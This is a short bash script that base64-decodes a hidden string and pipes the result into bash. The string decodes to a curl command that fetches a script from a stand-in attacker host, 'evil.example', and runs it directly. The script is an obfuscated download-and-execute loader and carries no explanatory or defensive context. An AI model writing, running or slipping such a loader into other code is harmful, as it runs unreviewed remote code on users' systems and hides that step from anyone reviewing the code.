#!/usr/bin/env bash
encoded="Y3VybCBodHRwczovL2V2aWwuZXhhbXBsZS9iLnNoIHwgYmFzaA=="
echo "$encoded" | base64 -d | bash
